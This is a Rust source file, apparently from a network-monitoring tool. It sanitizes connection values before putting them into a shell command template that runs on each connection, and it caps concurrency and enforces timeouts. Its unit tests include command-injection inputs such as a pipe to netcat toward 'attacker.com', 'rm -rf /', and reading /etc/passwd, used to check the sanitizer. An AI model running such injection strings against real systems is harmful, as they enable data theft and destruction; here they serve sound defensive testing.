use std::io;
use std::process::{Child, Command, ExitStatus};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::time::{Duration, Instant};

/// Maximum input length to prevent DoS via oversized inputs
const MAX_INPUT_LEN: usize = 256;
const MAX_ACTIVE_COMMANDS: usize = 64;
const EXECUTE_COMMAND_TIMEOUT: Duration = Duration::from_secs(30);
static ACTIVE_COMMANDS: AtomicUsize = AtomicUsize::new(0);

fn try_reserve_command_slot() -> bool {
    ACTIVE_COMMANDS
        .try_update(Ordering::AcqRel, Ordering::Relaxed, |active| {
            (active < MAX_ACTIVE_COMMANDS).then_some(active + 1)
        })
        .is_ok()
}

fn release_command_slot() {
    ACTIVE_COMMANDS.fetch_sub(1, Ordering::AcqRel);
}

fn truncate_to_char_boundary(s: &str, max_len: usize) -> &str {
    if s.len() <= max_len {
        return s;
    }

    let mut end = max_len;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// Shell-escape a string to prevent command injection.
/// Only allows safe characters: alphanumeric, dash, underscore, dot, colon.
/// Logs a warning if dangerous characters were stripped.
fn shell_escape(s: &str) -> String {
    if s.is_empty() {
        return String::new();
    }
    // Truncate overly long inputs
    let s = if s.len() > MAX_INPUT_LEN {
        tracing::warn!(
            "Input too long ({}), truncating to {} chars",
            s.len(),
            MAX_INPUT_LEN
        );
        truncate_to_char_boundary(s, MAX_INPUT_LEN)
    } else {
        s
    };

    let original = s;
    let sanitized: String = s
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_' || *c == '.' || *c == ':')
        .collect();

    if sanitized.len() != original.len() {
        tracing::warn!(
            "Stripped dangerous characters from input. Original: '{}', Sanitized: '{}'",
            safe_shell_escape_log_value(original),
            sanitized
        );
    }

    sanitized
}

fn safe_shell_escape_log_value(value: &str) -> String {
    nettrap_core::sanitize::single_line(value)
}

pub struct ExecuteOnConnect<'a> {
    pub template: &'a str,
    pub pid: Option<u32>,
    pub procname: Option<&'a str>,
    pub src_addr: &'a str,
    pub src_port: u16,
    pub dst_addr: &'a str,
    pub dst_port: u16,
    pub listener: &'a str,
}

/// Execute a command template when a connection is received.
/// Available template variables:
/// - {pid}: Process ID
/// - {procname}: Process name
/// - {src_addr}: Source IP address
/// - {src_port}: Source port
/// - {dst_addr}: Destination IP address
/// - {dst_port}: Destination port
/// - {listener}: Listener name
///
/// All template values are sanitized to prevent command injection.
/// WARNING: The template itself is NOT sanitized - only use trusted template strings!
pub fn execute_on_connect(args: ExecuteOnConnect<'_>) {
    let cmd = render_execute_command(&args);
    if cmd.trim().is_empty() {
        tracing::warn!("Rendered execute_cmd is empty; skipping execution");
        return;
    }

    tracing::info!("Executing command: {}", cmd);

    if !try_reserve_command_slot() {
        tracing::warn!(
            "Skipping execute_on_connect command: active command limit {} reached",
            MAX_ACTIVE_COMMANDS
        );
        return;
    }

    let result = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", &cmd]).spawn()
    } else {
        Command::new("sh").args(["-c", &cmd]).spawn()
    };

    match result {
        Ok(mut child) => {
            let wait_result = std::thread::Builder::new()
                .name("nettrap-exec-wait".to_string())
                .spawn(move || {
                    match wait_for_command(&mut child, EXECUTE_COMMAND_TIMEOUT) {
                        Ok(status) if !status.success() => {
                            tracing::warn!("Executed command exited with status {}", status);
                        }
                        Ok(_) => {}
                        Err(err) => {
                            tracing::warn!("Failed to wait on executed command: {}", err);
                        }
                    }
                    release_command_slot();
                });
            if let Err(err) = wait_result {
                release_command_slot();
                tracing::warn!("Failed to monitor executed command: {}", err);
            }
        }
        Err(e) => {
            release_command_slot();
            tracing::warn!("Failed to execute command: {}", e);
        }
    }
}

fn wait_for_command(child: &mut Child, timeout: Duration) -> io::Result<ExitStatus> {
    let deadline = Instant::now() + timeout;
    loop {
        match child.try_wait()? {
            Some(status) => return Ok(status),
            None if Instant::now() >= deadline => {
                child.kill()?;
                child.wait()?;
                return Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    format!(
                        "execute_on_connect command exceeded {} seconds",
                        timeout.as_secs()
                    ),
                ));
            }
            None => std::thread::sleep(Duration::from_millis(10)),
        }
    }
}

fn render_execute_command(args: &ExecuteOnConnect<'_>) -> String {
    let pid_str = args.pid.map(|p| p.to_string()).unwrap_or_else(|| {
        tracing::warn!("Missing process id for execute_cmd; leaving {{pid}} blank");
        String::new()
    });
    let procname_sanitized = args.procname.map(shell_escape).unwrap_or_else(|| {
        tracing::warn!("Missing process name for execute_cmd; leaving {{procname}} blank");
        String::new()
    });
    let src_addr_sanitized = shell_escape(args.src_addr);
    let dst_addr_sanitized = shell_escape(args.dst_addr);
    let listener_sanitized = shell_escape(args.listener);

    args.template
        .replace("{pid}", &pid_str)
        .replace("{procname}", &procname_sanitized)
        .replace("{src_addr}", &src_addr_sanitized)
        .replace("{src_port}", &args.src_port.to_string())
        .replace("{dst_addr}", &dst_addr_sanitized)
        .replace("{dst_port}", &args.dst_port.to_string())
        .replace("{listener}", &listener_sanitized)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn command_slots_are_bounded() {
        let mut reserved = 0;
        while try_reserve_command_slot() {
            reserved += 1;
        }

        assert_eq!(reserved, MAX_ACTIVE_COMMANDS);
        for _ in 0..reserved {
            release_command_slot();
        }
    }

    #[cfg(unix)]
    #[test]
    fn wait_for_command_kills_long_running_command() {
        let mut child = Command::new("sh")
            .args(["-c", "sleep 1"])
            .spawn()
            .expect("spawn sleeping command");

        let err = wait_for_command(&mut child, Duration::from_millis(10))
            .expect_err("sleeping command should time out");

        assert_eq!(err.kind(), io::ErrorKind::TimedOut);
    }

    #[test]
    fn test_shell_escape_safe() {
        assert_eq!(shell_escape("normal_process"), "normal_process");
        assert_eq!(shell_escape("my-app_v2.0"), "my-app_v2.0");
        assert_eq!(shell_escape("192.168.1.1"), "192.168.1.1");
    }

    #[test]
    fn test_shell_escape_dangerous() {
        assert_eq!(shell_escape("$(whoami)"), "whoami");
        // But the shell commands won't execute because $() is stripped
        assert_eq!(shell_escape("process`id`"), "processid");
        assert_eq!(
            shell_escape("process|nc attacker.com 4444"),
            "processncattacker.com4444"
        );
        assert_eq!(shell_escape("rm -rf /"), "rm-rf");
        assert_eq!(
            shell_escape("process;cat /etc/passwd"),
            "processcatetcpasswd"
        );
    }

    #[test]
    fn test_shell_escape_ipv6() {
        // IPv6 addresses use colons which are allowed
        assert_eq!(shell_escape("::1"), "::1");
        assert_eq!(shell_escape("fe80::1"), "fe80::1");
        assert_eq!(shell_escape("2001:db8::1"), "2001:db8::1");
    }

    #[test]
    fn test_shell_escape_truncation() {
        let long_input = "a".repeat(300);
        let result = shell_escape(&long_input);
        assert_eq!(result.len(), MAX_INPUT_LEN);
    }

    #[test]
    fn test_shell_escape_empty() {
        assert_eq!(shell_escape(""), "");
        assert_eq!(shell_escape("   "), "");
    }

    #[test]
    fn test_shell_escape_log_values_are_single_line() {
        let rendered = safe_shell_escape_log_value("proc\r\ninjected\u{2028}tail");

        assert_eq!(rendered, "proc  injected tail");
        assert!(!rendered.chars().any(char::is_control));
        assert!(!rendered.contains('\u{2028}'));
    }

    #[test]
    fn render_execute_command_leaves_missing_process_name_blank() {
        let rendered = render_execute_command(&ExecuteOnConnect {
            template: "echo {procname}:{pid}:{src_addr}:{dst_addr}:{listener}",
            pid: Some(42),
            procname: None,
            src_addr: "127.0.0.1",
            src_port: 1234,
            dst_addr: "10.0.0.7",
            dst_port: 80,
            listener: "http",
        });

        assert_eq!(rendered, "echo :42:127.0.0.1:10.0.0.7:http");
    }

    #[test]
    fn render_execute_command_leaves_missing_process_id_blank() {
        let rendered = render_execute_command(&ExecuteOnConnect {
            template: "echo {procname}:{pid}:{src_addr}:{dst_addr}:{listener}",
            pid: None,
            procname: Some("calc.exe"),
            src_addr: "127.0.0.1",
            src_port: 1234,
            dst_addr: "10.0.0.7",
            dst_port: 80,
            listener: "http",
        });

        assert_eq!(rendered, "echo calc.exe::127.0.0.1:10.0.0.7:http");
    }

    #[test]
    fn render_execute_command_can_render_to_empty_command() {
        let rendered = render_execute_command(&ExecuteOnConnect {
            template: "{procname}{pid}",
            pid: None,
            procname: None,
            src_addr: "127.0.0.1",
            src_port: 1234,
            dst_addr: "10.0.0.7",
            dst_port: 80,
            listener: "http",
        });

        assert!(rendered.trim().is_empty());
    }
}
